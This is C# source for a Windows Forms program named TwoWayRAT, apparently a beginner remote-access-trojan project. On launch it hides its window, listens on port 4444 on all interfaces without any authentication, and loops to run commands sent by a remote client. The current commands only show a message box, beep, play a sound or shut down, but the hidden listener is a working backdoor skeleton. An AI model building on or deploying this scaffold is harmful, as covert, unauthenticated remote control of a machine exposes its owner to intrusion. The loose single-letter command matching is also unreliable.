using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TwoWayRAT
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamReader streamReader;
        StreamWriter streamWriter; // Send ing data back to client from server

        Thread th_message, th_beep, th_playsound;

        // Commands from client
        const string HELP = "h",
                    MESSAGE = "m",
                    BEEP = "b",
                    PLAYSOUND = "p",
                    SHUTDOWNSERVER = "s"; // Shuts down the server process and port

        const string strHelp = "Command Menu:\r\n" +
                                "h ThisHelp\r\n" +
                                "m Message\r\n" +
                                "b Beep\r\n" +
                                "p Playsound\r\n" +
                                "s Shutdown the Server Process and Port\r\n";
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
            tcpListener.Start();
            for (; ; ) RunServer(); //perpetually spawn socket until SHUTDOWN command is received
        }

        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);

            try
            {
                string line;

                // Command loop, searching for command strings sent by client
                while (true)
                {
                    line = "";
                    line = streamReader.ReadLine();
                    if (line.LastIndexOf(HELP) >= 0)
                    {
                        streamWriter.Write(strHelp);
                        streamWriter.Flush(); // Push to the client
                    }
                    if (line.LastIndexOf(MESSAGE) >= 0)
                    {
                        th_message = new Thread(new ThreadStart(MessageCommand));
                        th_message.Start();
                    }
                    if (line.LastIndexOf(BEEP) >= 0)
                    {
                        th_beep = new Thread(new ThreadStart(BeepCommand));
                        th_beep.Start();
                    }
                    if (line.LastIndexOf(PLAYSOUND) >= 0)
                    {
                        th_playsound = new Thread(new ThreadStart(PlaySoundCommand));
                        th_playsound.Start();
                    }
                    if (line.LastIndexOf(SHUTDOWNSERVER) >= 0)
                    {
                        streamWriter.Flush();
                        CleanUp();
                        System.Environment.Exit(System.Environment.ExitCode);
                    }
                }
            }
            catch (Exception exc)
            {
                CleanUp();
            }
        }

        private void CleanUp()
        {
            streamReader.Close();
            networkStream.Close();
            socketForClient.Close();
        }

        private void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }

        private void BeepCommand()
        {
            Console.Beep(500, 2000);
        }

        private void MessageCommand()
        {
            MessageBox.Show("Hello World!");
        }
    }
}
